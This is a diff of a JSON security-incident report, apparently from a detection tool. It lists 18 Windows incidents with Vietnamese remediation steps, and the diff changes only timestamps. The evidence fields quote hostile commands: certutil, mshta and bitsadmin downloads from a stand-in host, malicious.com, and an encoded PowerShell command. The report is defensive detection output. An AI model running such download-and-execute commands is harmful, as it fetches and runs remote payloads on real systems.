@@ -1,5 +1,5 @@
 {
-  "timestamp": "2026-09-05T19:44:02.295261",
+  "timestamp": "2026-09-05T23:13:18.982273",
   "question": "Có sự cố gì cần xử lý?",
   "total_incidents": 18,
   "by_severity": {
@@ -23,7 +23,7 @@
         "Filter to Consumer Binding"
       ],
       "recommended_action": "Kiểm tra WMI event subscribers, xóa các subscriptions lạ",
-      "created_at": "2026-09-05T19:44:02.215988"
+      "created_at": "2026-09-05T23:13:18.944133"
     },
     {
       "incident_id": "INC-0010",
@@ -41,7 +41,7 @@
         "Service pipe access"
       ],
       "recommended_action": "Điều tra toàn bộ assets, kiểm tra audit logs",
-      "created_at": "2026-09-05T19:44:02.261357"
+      "created_at": "2026-09-05T23:13:18.973797"
     },
     {
       "incident_id": "INC-0013",
@@ -57,7 +57,7 @@
         "Ticket granting anomalies"
       ],
       "recommended_action": "Kiểm tra Kerberos delegation settings, audit ticket generation",
-      "created_at": "2026-09-05T19:44:02.261357"
+      "created_at": "2026-09-05T23:13:18.973797"
     },
     {
       "incident_id": "INC-0014",
@@ -73,7 +73,7 @@
         "Suspicious API calls (ReadProcessMemory, etc.)"
       ],
       "recommended_action": "Kiểm tra ngay lập tức, isolate affected systems",
-      "created_at": "2026-09-05T19:44:02.295261"
+      "created_at": "2026-09-05T23:13:18.982273"
     },
     {
       "incident_id": "INC-0015",
@@ -90,7 +90,7 @@
         "Pass-the-hash activity"
       ],
       "recommended_action": "Reset tất cả passwords, kiểm tra kerberos tickets",
-      "created_at": "2026-09-05T19:44:02.295261"
+      "created_at": "2026-09-05T23:13:18.982273"
     },
     {
       "incident_id": "INC-0016",
@@ -106,7 +106,7 @@
         "KRBTGT ticket access"
       ],
       "recommended_action": "Kiểm tra Kerberos logs, reset KRBTGT password",
-      "created_at": "2026-09-05T19:44:02.295261"
+      "created_at": "2026-09-05T23:13:18.982273"
     },
     {
       "incident_id": "INC-0017",
@@ -122,7 +122,7 @@
         "Reg command (reg save) usage"
       ],
       "recommended_action": "Kiểm tra registry access logs, audit VSS usage",
-      "created_at": "2026-09-05T19:44:02.295261"
+      "created_at": "2026-09-05T23:13:18.982273"
     },
     {
       "incident_id": "INC-0001",
@@ -136,7 +136,7 @@
         "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
       ],
       "recommended_action": "Kiểm tra registry run keys, xóa entries lạ",
-      "created_at": "2026-09-05T19:44:02.215988"
+      "created_at": "2026-09-05T23:13:18.944133"
     },
     {
       "incident_id": "INC-0002",
@@ -150,7 +150,7 @@
         "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
       ],
       "recommended_action": "Kiểm tra Startup folders, xóa files lạ",
-      "created_at": "2026-09-05T19:44:02.215988"
+      "created_at": "2026-09-05T23:13:18.944133"
     },
     {
       "incident_id": "INC-0003",
@@ -164,7 +164,7 @@
         "registry services entries"
       ],
       "recommended_action": "Kiểm tra services mới, xóa nếu lạ",
-      "created_at": "2026-09-05T19:44:02.215988"
+      "created_at": "2026-09-05T23:13:18.944133"
     },
     {
       "incident_id": "INC-0005",
@@ -178,7 +178,7 @@
         "Command: powershell.exe -enc JABjAG8A..."
       ],
       "recommended_action": "Điều tra process PowerShell.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:44:02.245480"
+      "created_at": "2026-09-05T23:13:18.963758"
     },
     {
       "incident_id": "INC-0006",
@@ -192,7 +192,7 @@
         "Command: certutil.exe -urlcache -f http://malicious.com/file.exe"
       ],
       "recommended_action": "Điều tra process certutil.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:44:02.245480"
+      "created_at": "2026-09-05T23:13:18.963758"
     },
     {
       "incident_id": "INC-0007",
@@ -206,7 +206,7 @@
         "Command: mshta.exe http://malicious.com/payload.hta"
       ],
       "recommended_action": "Điều tra process mshta.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:44:02.245480"
+      "created_at": "2026-09-05T23:13:18.963758"
     },
     {
       "incident_id": "INC-0008",
@@ -220,7 +220,7 @@
         "Command: bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe"
       ],
       "recommended_action": "Điều tra process bitsadmin.exe, cân nhắc terminate nếu xác nhận malicious",
-      "created_at": "2026-09-05T19:44:02.245480"
+      "created_at": "2026-09-05T23:13:18.963758"
     },
     {
       "incident_id": "INC-0009",
@@ -238,7 +238,7 @@
         "Unusual SMB client behavior"
       ],
       "recommended_action": "Kiểm tra SMB logs, xác minh kết nối",
-      "created_at": "2026-09-05T19:44:02.261357"
+      "created_at": "2026-09-05T23:13:18.973797"
     },
     {
       "incident_id": "INC-0011",
@@ -254,7 +254,7 @@
         "WinRM service abuse"
       ],
       "recommended_action": "Kiểm tra WinRM logs, audit remote sessions",
-      "created_at": "2026-09-05T19:44:02.261357"
+      "created_at": "2026-09-05T23:13:18.973797"
     },
     {
       "incident_id": "INC-0012",
@@ -270,7 +270,7 @@
         "RDP to sensitive systems"
       ],
       "recommended_action": "Kiểm tra RDP event logs, xác minh logins",
-      "created_at": "2026-09-05T19:44:02.261357"
+      "created_at": "2026-09-05T23:13:18.973797"
     },
     {
       "incident_id": "INC-0018",
@@ -287,7 +287,7 @@
         "Plaintext SMB auth"
       ],
       "recommended_action": "Enforce encryption, disable plaintext protocols",
-      "created_at": "2026-09-05T19:44:02.295261"
+      "created_at": "2026-09-05T23:13:18.982273"
     }
   ]
 }
